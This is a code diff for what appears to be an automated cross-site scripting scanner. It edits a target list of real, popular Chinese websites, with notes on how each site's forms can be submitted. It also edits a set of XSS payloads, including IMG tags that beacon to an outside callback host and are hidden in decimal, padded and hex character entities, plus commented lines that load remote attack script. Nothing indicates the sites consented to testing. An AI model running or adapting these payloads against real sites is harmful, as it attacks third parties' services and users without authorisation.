@@ -1,30 +1,30 @@
 # _*_coding:utf-8_*_
 
 sites = [
+    'http://www.2925.com/write.aspx',
+    # "http://www.2925.com/index.aspx",
     # "http://magicmining.sinaapp.com/chat",
     # "http://www.baidu.com",
     # 没有提交按钮 是超链接 可以通过构造参数提交 "http://tieba.baidu.com/",
     # "http://127.0.0.1/dvwa/vulnerabilities/xss_r/",
-    # 没有表单 直接从input提交 "http://www.u17.com",
+    # 没有表单 直接从input提交
+    "http://www.u17.com",
     # 复杂页面 多个搜索类别共用一个表单 通过hidden参数改变类别 同时搜索值也是一个hidden参数 由脚本更改后提交 "http://www.sina.com.cn/",
     # 没有表单 但可以提交意见 "http://cbg.baidu.com/?sc=1000020",
     # 复杂页面 "http://map.baidu.com",
     # 无法打开 "http://weibo.com/",
     # 有post表单 "http://www.sohu.com/",
     # 无法打开 "http://www.qq.com/",
-    # 可以改 "http://www.iqiyi.com/",
+    # 表单与按钮配合 "http://www.iqiyi.com/",
     # 复杂页面 报错 "http://www.ifeng.com",
     # "http://www.autohome.com.cn",
-    # "http://www.eastmoney.com",
+    #　"http://www.eastmoney.com",
     # 没有找到表单 "http://www.fang.com/",
-    # 报错 "http://www.ctrip.com",
     # "http://www.qunar.com/",
-    # 报错 "http://www.ganji.com/",
     # 有post表单 "http://www.lianjia.com/",
     # 没有表单 "http://www.meipai.com",
     # 参数太多无法模拟提交 "http://www.zhaopin.com",
     # radio "http://www.ccb.com/",
-    # 没有表单 通过点击span提交 "http://www.kaola.com/?__da_wH4H6k_geWAxF",
     # 超时 "http://www.17173.com/",
     # 超时 "http://military.china.com/zh_cn/",
     # 超时 "http://www.xinjunshi.com/",
@@ -33,6 +33,7 @@ sites = [
     # "http://www.fang.com",
     # "http://www.78.cn/?sid=1102",
     "http://www.10086.cn/",
+    "http://www.ganji.com/",
     "http://www.pcauto.com.cn/",
     "http://www.bitauto.com/",
     "http://www.xcar.com.cn/",
@@ -97,27 +98,22 @@ sites = [
 def fun(string):
     r = ''
     for s in string:
-        r += '&#0000%d' % ord(s)
+        r += '&#x%x' % ord(s)
     return r
+
 
 xss_vectors = [
     '''<SCRIPT>alert('XSS');</SCRIPT>''',
     # ''''';!--"<XSS>=&{()}''',
-    # '''<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>''',
-    '''<IMG SRC=http://wedge.sinaapp.com/s?k=$3>''',  # IE7后不支持 <IMG SRC="javascript:alert('XSS');">
-    # '''SRC=&#10<IMG 6;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>''',
-    # <IMG SRC=http://wedge.sinaapp.com/s?k=$4>'''
-    '''<IMG SRC=&#0000104&#0000116&#0000116&#0000112&#000058&#000047&#000047&#0000119&#0000101&#0000100&#0000103&#0000101&#000046&#0000115&#0000105&#0000110&#000097&#000097&#0000112&#0000112&#000046&#000099&#0000111&#0000109&#000047&#0000115&#000063&#0000107&#000061&#000036&#000052>''',
-    # '''<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>''',
-    # '''<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>''',
-    # '''<IMG SRC="jav	ascript:alert('XSS');">''',
-    # '''<IMG SRC="jav&#x09;ascript:alert('XSS');">''',
-    # '''<IMG SRC="jav&#x0A;ascript:alert('XSS');">''',
-    # '''<IMG SRC="jav&#x0D;ascript:alert('XSS');">''',
-    # '''<IMG SRC=" &#14;  javascript:alert('XSS');">''',
+    '''<IMG SRC=http://wedge.sinaapp.com/3>''',  # IE7后不支持 <IMG SRC="javascript:alert('XSS');">
+    # http://wedge.sinaapp.com/s?k=$4
+    '''<IMG SRC=&#104;&#116;&#116;&#112;&#58;&#47;&#47;&#119;&#101;&#100;&#103;&#101;&#46;&#115;&#105;&#110;&#97;&#97;&#112;&#112;&#46;&#99;&#111;&#109;&#47;&#52;>''',
+    # http://wedge.sinaapp.com/s?k=$5
+    '''<IMG SRC=&#0000104&#0000116&#0000116&#0000112&#000058&#000047&#000047&#0000119&#0000101&#0000100&#0000103&#0000101&#000046&#0000115&#0000105&#0000110&#000097&#000097&#0000112&#0000112&#000046&#000099&#0000111&#0000109&#000047&#000053>''',
+    # http://wedge.sinaapp.com/s?k=$6
+    '''<IMG SRC=&#x68&#x74&#x74&#x70&#x3a&#x2f&#x2f&#x77&#x65&#x64&#x67&#x65&#x2e&#x73&#x69&#x6e&#x61&#x61&#x70&#x70&#x2e&#x63&#x6f&#x6d&#x2f&#x36>''',
     # '''<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>''',
     # '''<SCRIPT SRC=http://ha.ckers.org/xss.js?<B>''',
-    # 重复 '''<IMG SRC="javascript:alert('XSS')"''',
     # '''<SCRIPT>a=/XSS/''',
     # '''\";alert('XSS');//''',
     # '''<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">''',
